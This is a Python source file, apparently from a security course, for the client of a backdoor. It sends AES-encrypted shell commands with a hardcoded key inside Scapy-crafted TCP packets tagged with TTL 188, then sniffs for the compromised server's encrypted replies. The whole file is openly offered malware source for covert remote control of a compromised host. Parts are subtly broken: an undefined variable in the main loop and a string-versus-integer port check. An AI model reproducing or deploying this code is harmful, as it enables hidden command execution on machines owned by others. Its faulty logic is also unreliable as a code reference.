'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    Client.py
--
--  PROGRAM:        Sends data (commands) to the compromised server and receives
--					back the output from the server.
--                 
--	FUNCTIONS:		encryptData(data),
--					decryptData(data),
--					packetCraft(destIP, destPort, data),
--					getOutput(packet),
--					packetCheck(packet).
--
--  DATE:           October 9, 2015
--
--  REVISIONS:      October 16, 2015
--
--  NOTES:
--  The program requires "Scapy", argparse, and pycrypto APIs as well as root 
--	user privilege in order to work properly.
--  http://www.secdev.org/projects/scapy/
--  https://docs.python.org/dev/library/argparse.html
--  https://pypi.python.org/pypi/pycrypto
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

#!/usr/bin/python
from scapy.all import *
from Crypto.Cipher import AES
import argparse

#Set command line arguments for the program.
cmdParser = argparse.ArgumentParser(description="Client Backdoor Program")
cmdParser.add_argument('-d',
					'--dstIP',
					dest='destIP',
					help='Destination IP address of the host to send the command to.',
					required=True)
cmdParser.add_argument('-p',
					'--dstPort',
					dest='destPort',
					help='Destination port of the host to send the command to.',
					required=True)
args = cmdParser.parse_args();

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       encryptData
--  Parameters:
--      data
--			The plaintext string - the command.
--  Return Values:
--      encryptedData
--			The ciphertext of the AES encrypted plaintext.
--  Description:
--      Function to encrypt the passed in data string using AES with the specified
-- 		encryption key and salt value.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
def encryptData(data):
	#Both key and salt values have to be 16 bytes due to the way AES encryption works.
	key = "JustinTom 8505A3"
	salt = "A00852990-Justin"
	#Create an encryption object with the specified key and salt value in CFB mode.
	objAES = AES.new(key, AES.MODE_CFB, salt)
	#Pass in the data to encrypt and assign the return value.
	encryptedData = objAES.encrypt(data)
	return encryptedData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       decryptData
--  Parameters:
--      data
--			The plaintext string - the command output.
--  Return Values:
--      decryptedData
--			The plaintext of the AES encrypted ciphertext.
--  Description:
--      Function to decrypt the passed in data string using AES with the specified
-- 		decryption key and salt value.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
def decryptData(data):
	#Both key and salt values have to be 16 bytes due to the way AES encryption works.
	key = "JustinTom 8505A3"
	salt = "A00852990-Justin"
	#Create a decryption object with the specified key and salt value in CFB mode.
	objAES = AES.new(key, AES.MODE_CFB, salt)
	#Pass in the data to decrypt and assign the return value.
	decryptedData = objAES.decrypt(data)
	return decryptedData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       packetCraft
--  Parameters:
--      destIP
--			User specified destination IP address.
--      destPort
--			User specified destination port.
--      data
--			The data to send (encrypted command)
--  Return Values:
--      craftedPacket
--			The scapy generated custom packet with the custom fields.
--  Description:
--      Function to build a custom packet with the user specified values in order
--		to later send to the server.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
def packetCraft(destIP, destPort, data):
    destPort = int(destPort)
    #Craft a custom packet with the specified values, and the encrypted 
    #data command in the load field of the packet's Raw layer. Also set the 
    #ttl to 188 as an extra layer of identity.
    craftedPacket = IP(dst=destIP, ttl=188)/TCP(dport=destPort)/Raw(load=data)
    return craftedPacket

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       getOutput
--  Parameters:
--      packet
--			The packet object that is sniffed with scapy.
--  Return Values:
--      None.
--  Description:
--      Function to parse the packet object from the scapy sniff of the network
--		traffic going to the terminal and filter it further to ensure it is the 
--		packet we are looking for from the compromised server. It will then 
--		decrypt the extracted data.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
def getOutput(packet):
	#Sometimes an ARP broadcast and request before sending crafted packets
	#If condition to filter out the ARP packets since we only want the
	#crafted packet from the server.
	if IP in packet[0] and Raw in packet[2]:
		ttl = packet[IP].ttl
		srcIP = packet[IP].src
		dPort = packet[TCP].dport
		if ttl == 188 and srcIP == args.destIP and dPort == args.destPort:
			output = packet[Raw].load
			decryptedOutput = decryptData(output)
			print decryptedOutput
			return

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       packetCheck
--  Parameters:
--      packet
--			The packet object that is sniffed with scapy.
--  Return Values:
--      True
--			If the packet is the right one we're expecting.
--		False
--			If the packet is not the right one we're expecting.
--  Description:
--      Function to check if the packet we sniffed is the right one by filtering it
--		by the values we've put in our crafter packets. Returns true or false.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
def packetCheck(packet):
	if IP in packet[0] and Raw in packet[2]:
		ttl = packet[IP].ttl
		srcIP = packet[IP].src
		dPort = packet[TCP].dport
		if ttl == 188 and srcIP == args.destIP and dPort == args.destPort:
			return True
	else:
		return False

if __name__ == "__main__":
	sendFlag = True
	#Continuously loop and prompt the user for the next command to send to the
	#server after receicing the respective output from the server.
	while True:
		if sendFlag:
			#Indicator that the user is in the remote shell of the server.
			command = raw_input("[" +
	    					args.destIP +
	    					"] " +
	    					"Remote Shell$ ")
			#Exit command will break out of the loop and inform user.
			if command == "exit":
				print "Remote connection to " + args.destIP + " now closed."
				break
			#Encrypt the command string.
			secureData = encryptData(command)
			#Craft the packet with the user specified destination IP, port and command.
			packet = packetCraft(args.destIP, args.destPort, secureData)
			#Send the packet with no verbose
			send(packet, verbose=0)
			sendFlag = False
		#After the command is inputted, sniff for the output result.
		else:
			#Sniff for the output result of the command from the server
			#Ensure a stop filter when the correct packet is received.
			dstPort = str(destPort)
			sniff(filter="tcp and dstPort " + dstPort, prn=getOutput, stop_filter=packetCheck)
			sendFlag = True